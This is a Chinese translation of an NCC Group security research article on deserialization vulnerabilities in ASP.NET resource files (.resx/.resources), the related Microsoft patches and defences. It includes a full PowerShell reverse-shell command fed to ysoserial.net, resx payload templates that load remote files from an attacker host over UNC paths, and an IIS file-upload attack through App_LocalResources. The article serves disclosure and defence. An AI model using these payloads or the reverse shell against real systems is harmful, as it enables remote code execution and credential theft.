> 原文链接: https://www.anquanke.com//post/id/154049 


# 对ASP.NET资源文件（.RESX）及反序列化漏洞的研究


                                阅读量   
                                **169411**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Soroush Dalili，文章来源：nccgroup.trust
                                <br>原文地址：[https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01c05ed2a3d24b4473.jpg)](https://p3.ssl.qhimg.com/t01c05ed2a3d24b4473.jpg)

## 概述

ASP.NET应用程序中的资源文件通常用作本地化存储，它们可用于存储 用户交互界面元素 或 可被轻松翻译的字符串[1]。这些资源文件一般用`.resx`作为文件拓展名，而当它们以`.resources`作为文件拓展名时，还能够被应用程序编译使用。可在微软的网站上了解到资源文件的更多信息[2, 3]

这些资源文件虽然是XML格式的，但是它们仍可以包含序列化对象。二进制对象在被序列化后，可以存储在以base64编码的`.resx`文件中。资源文件支持`BinaryFormatter`， `SoapFormatter`和`TypeConverters`，这些方法均能被滥用于 反序列化不够安全的对象 或是 加载外部文件

这篇文章旨在更详细地讨论这种`attack vector`（攻击向量），提升大家对它的认知深度，本研究中确认问题的灵感来源于AlvaroMuñoz和Oleksandr Mirosh撰写的白皮书，** Friday the 13th JSON Attacks8**



## 补丁与遗留问题

我早在2018年1月时便向微软报告了资源文件（`.resx`和`.resources`）中的一些反序列化问题，但直至2018年7月微软才在许多产品中发布了多个补丁（CVE-2018-8172，CVE-2018-8172和 CVE-2018-8300），例如在这之前 SharePoint 与 Visual Studio 一直都在以不安全的方式处理`资源文件`[7]<br>[![](https://p3.ssl.qhimg.com/t0180ed83368c1026a0.gif)](https://p3.ssl.qhimg.com/t0180ed83368c1026a0.gif)

在打上2018年7月的补丁后，已经无法在 Visual Studio 中直接打开有着Web记号（MOTW）[8]的`.resx`和`.resources`文件。当`MOTW`工作时，`resgen.exe`工具[9]会显示错误，而`winres.exe`工具[10]则会始终显示警告消息。值得注意的是，从压缩包中解压出的文件 或者是从 IE或Edge之外的浏览器中下载的文件 可能并被没有`MOTW`，大家应该更加谨慎地处理它们

微软开发者中心（MSDN）[11]的`System.Resources命名空间`文档也已经有了对应更新，包括`ResourceManager`，`ResourceReader`和`ResourceSet`方法的如下安全说明：

```
“Calling methods in this class with untrusted data is a security risk. Call the methods in the class only with trusted data. For more information, see Untrusted Data Security Risks”.
```

```
“使用不受信任的数据调用此类中的方法存在安全风险。仅使用受信任的数据调用此类中的方法。有关的更多信息，可参阅 不被信任数据存在的安全风险
```

我们应该注意到，`System.Resources方法`的行为尚未被更改，因此所有使用了ASP.NET库 读取、编译 或是 反编译 `资源文件`的应用程序（例如[12]和[13]），如果接受用户提供的资源文件，则很可能会受到攻击



## 如何对System.Resources命名空间产生影响？

因为无法事先确定资源文件中的序列化对象类型，所以不能通过排查 不安全的反序列化 这种方法来防止恶意代码执行。虽然在使用`BinaryFormatter`时可以保护到某些方法，但是想要预防所有的攻击是根本于事无补的，因为`SoapFormatter`或`TypeConverters`可以用作替代方法进行绕过

资源文件 还可以使用 UNC路径 指向本地文件或共享资源，而这又可能导致 文件枚举 或 SMB哈希劫持 等次要风险。当客户端工具被当成目标时， SMB哈希劫持可能会面临更高更大的风险

由于`.resx`文件基于XML，因此在使用普通XML库读取资源文件时，自定义的解析器可能容易遭受XML外部实体（XXE）攻击。但是默认情况下，`ResXResourceReader`类并不会处理 文档类型定义（DTD）这部分的`XmlTextReader`

### <a class="reference-link" name="%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82"></a>技术细节

可以使用 数据的`mimetype`属性 和 元数据标签 在资源文件内反序列化对象，此外`type`属性还可以被用来反序列化使用了`TypeConverters`的对象

**通过BinaryFormatter和SoapFormatter进行反序列化**

在以下情况使用`BinaryFormatter`（`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter`）对资源文件中的对象进行反序列化：
<li>
`mimetype`属性提交空值给`数据标签`;或者</li>
<li>
`mimetype`属性是以下`数据`或`元数据标签`之一：</li>
```
application/x-microsoft.net.object.binary.base64
text/microsoft-urt/psuedoml-serialized/base64
text/microsoft-urt/binary-serialized/base64
```

在以下情况使用`SoapFormatter`（`System.Runtime.Serialization.Formatters.Soap.SoapFormatter`）对资源文件中的对象进行反序列化：
<li>
`mimetype`属性是以下`数据`或`元数据标签`之一：</li>
```
application/x-microsoft.net.object.soap.base64
text/microsoft-urt/soap-serialized/base64
```

由[14]处的源代码可知，`SoapFormatter`并没有通过`System.Web`被使用，然而这仍然可以通过 将 资源文件 上传到 ASP.NET Web应用程序 的资源文件夹中来执行

ysoserial.net项目[15]可在没有事先知道反序列化问题的情况下，生成Payload（攻击载荷）。下面的例子展示了如何生成具有 `反向PowerShell` 功能的Payload（攻击载荷）

```
$command = '$client = New-Object System.Net.Sockets.TCPClient("remote_IP_here", remote_PORT_here);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%`{`0`}`;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`{`;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()`}`;$client.Close()'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

$encodedCommand = [Convert]::ToBase64String($bytes)

./ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell.exe -encodedCommand $encodedCommand"
```

然后如下所示，将生成的Payload（攻击载荷）用于资源文件当中

```
[Resource file default scheme and headers redacted]

&lt;data name="test1_BinaryFormatter" mimetype="application/x-microsoft.net.object.binary.base64"&gt;
&lt;value&gt;[BinaryFormatter payload goes here without the square brackets]&lt;/value&gt;
&lt;/data&gt;
```

**通过`TypeConverters`进行反序列化**

虽然资源文件在多数情况下会使用`TypeConverters`，但是那些受`CanConvertFrom`方法检查的兼容类型同样也很重要。攻击者能够通过查找合适的类文件，使用`ConvertFrom`方法来执行代码。关于这种攻击的更多信息，可以查看** Friday the 13th JSON Attacks [5] **白皮书

以下方案展示了，`TypeConverters`在作为`type`属性的`fully qualified assembly name`（完全限定集名）的资源文件里的用法[译者注：这段真的难译啊T T]
- 当`application / x-microsoft.net.object.bytearray.base64`在`mimetype`里时：
```
&lt;data name="test1" mimetype="application/x-microsoft.net.object.bytearray.base64" type="A Fully Qualified Assembly Name Here"&gt;&lt;value&gt;Base64 ByteArray Payload Here&lt;/value&gt;&lt;/data&gt;
```

它需要接受一个`CanConvertFrom`中`byte []`类型的类文件
- 当`mimetype`属性不可用、`type`属性不为`null`（空）且不包含`System.Byte []`类型和`mscorlib`字符串时：
```
&lt;data name="test1" type="A Fully Qualified Assembly Name Here"&gt;
&lt;value&gt;String Payload Here&lt;/value&gt;
&lt;/data&gt;
```

它需要接受一个`CanConvertFrom`中`String`类型的类文件
- 当能够包含使用了`System.Resources.ResXFileRef`类型的外部文件路径时：
```
&lt;data name="test1" type="System.Resources.ResXFileRef, System.Windows.Forms"&gt;
&lt;value&gt;UNC_PATH_HERE; A Fully Qualified Assembly Name Here&lt;/value&gt;
&lt;/data&gt;
```

在获取`fully qualified assembly name`（完全限定集名）时，它支持`String`，`Byte []`和`MemoryStream`类型，而这又可能会被滥用于加载 包含了恶意序列化对象 的另一个资源文件，于是便可用来绕过对初始资源文件的潜在限制条件。下面的数据标签就是一个例子：

```
&lt;data name="foobar" type="System.Resources.ResXFileRef"&gt;
 &lt;value&gt;
 \attacker.compayload.resx; System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 &lt;/value&gt;
 &lt;/data&gt;
```

`ResXFileRef`类型还可以通过错误消息用作 文件枚举，也能通过 UNC路径 进行SMB哈希劫持。 比如：

```
&lt;data name="foobar" type="System.Resources.ResXFileRef, System.Windows.Forms"&gt;
 &lt;value&gt;\AttackerServertesttest;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&lt;/value&gt;
 &lt;/data&gt;
```



## 趣味示例：在IIS上攻击不安全的文件上传程序

除了那些 允许用户提供任意资源文件 用来 自定义其本地设置 的应用软件 和 在用户交互界面显示 资源文件 的应用程序之外，具有以下特征的文件上传程序也很有可能受到影响：
- 可以上传扩展名为`.resx`或`.resources`的文件，并且
- 文件可以上传到 被上传文件夹 中的任意子文件夹中，并且
- 被上传文件夹可以通过Web访问到，并且
- 尚未禁用被上传文件夹中ASP.NET程序（`*.aspx`、 `*.ashx`、`*.asmx`或 `*_appservice.axd`）的执行权限
将资源文件直接上传到`App_GlobalResources`或`App_LocalResources`文件夹，可能导致远程代码执行，这将使那些未考虑到`.resx`或`.resources` 并且 允许用户上传这些文件 的应用程序陷入危险的境地。正因为`App_GlobalResources`目录只可能位于应用程序的根目录下，所以`App_LocalResources`文件夹简直就是为此类攻击而生

攻击者可以将恶意资源文件（`.resx`或`.resources`）上传到 被上传文件夹 中的`App_LocalResources`文件夹，然后从 被上传文件夹 中调用任意ASP.NET文件（甚至不管存在与否）来执行任意代码

可以使用`resgen.exe`工具编译`.resx`文件以创建`.resources`，值得一提的是`exploit code`（EXP，漏洞利用代码）也将在编译过程中被执行

如果尚未在IIS服务器上创建过文件夹，攻击者则可以使用`App_LocalResources :: $ Index_allocation`或`App_LocalResources：$ i30：$ index_allocation trick in filename`创建`App_LocalResources`文件夹。获取更多有关此技术的信息，可参阅OWASP.org [16]

以下文件和目录树显示了成功上载文件的示例：

```
|_ wwwroot
     |_ MyApp
         |_ Userfiles
              |_ App_LocalResources
                     |_ test.resx

```

到现在为止，只要打开`/MyApp/Usefiles/foobar.aspx`页面，就能够在Web服务器上执行代码，`test.resx`文件可以用它被编译过后的文件`test.resources`替换，`foobar.aspx`文件也无需存在于服务器上



## 结论
1. 没有经过足够的验证时，请勿相信任何资源文件
1. 如果资源文件必须用在 包含字符串的值 上，那么建议使用`simple XML parser object`（简单XML解析器对象）解析`.resx`文件并读取值，而不要去处理`DTD`部分，这样便可以安全地对通用类型数据进行处理，而并不需要使用反序列化、类型转换器和文件引用功能
1. 为了保护文件上传程序，请确保在 被上传文件夹 中禁用ASP.NET扩展，并且配合使用白名单验证的方法（不要包括`.resx`和`.resources`扩展名）。 更多的建议可以在OWASP.org [16]中获取


## 引用的相关资源

[1] [https://msdn.microsoft.com/en-us/library/ms247246.aspx](https://msdn.microsoft.com/en-us/library/ms247246.aspx)<br>
[2] [https://msdn.microsoft.com/en-us/library/ekyft91f(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/ekyft91f(v=vs.85).aspx)<br>
[3] [https://docs.microsoft.com/en-us/dotnet/framework/resources/working-with-resx-files-programmatically](https://docs.microsoft.com/en-us/dotnet/framework/resources/working-with-resx-files-programmatically)<br>
[4] [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)<br>
[5] [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)<br>
[6] [https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments)<br>
[7] [https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-unsafe-resource-handling-in-multiple-microsoft-products/](https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-unsafe-resource-handling-in-multiple-microsoft-products/)<br>
[8] [https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/ms537628(v=vs.85](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/ms537628(v=vs.85))<br>
[9] [https://docs.microsoft.com/en-us/dotnet/framework/tools/resgen-exe-resource-file-generator](https://docs.microsoft.com/en-us/dotnet/framework/tools/resgen-exe-resource-file-generator)<br>
[10] [https://docs.microsoft.com/en-us/dotnet/framework/tools/winres-exe-windows-forms-resource-editor](https://docs.microsoft.com/en-us/dotnet/framework/tools/winres-exe-windows-forms-resource-editor)<br>
[11] [https://msdn.microsoft.com/en-us/library/system.resources(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.resources(v=vs.110).aspx)<br>
[12] [https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/](https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/)<br>
[13] [https://github.com/icsharpcode/ILSpy/issues/1196](https://github.com/icsharpcode/ILSpy/issues/1196)<br>
[14] [http://referencesource.microsoft.com/#System.Windows.Forms/winforms/Managed/System/Resources/ResXDataNode.cs,459](http://referencesource.microsoft.com/#System.Windows.Forms/winforms/Managed/System/Resources/ResXDataNode.cs,459)<br>
[15] [https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)<br>
[16] [https://www.owasp.org/index.php/Unrestricted_File_Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
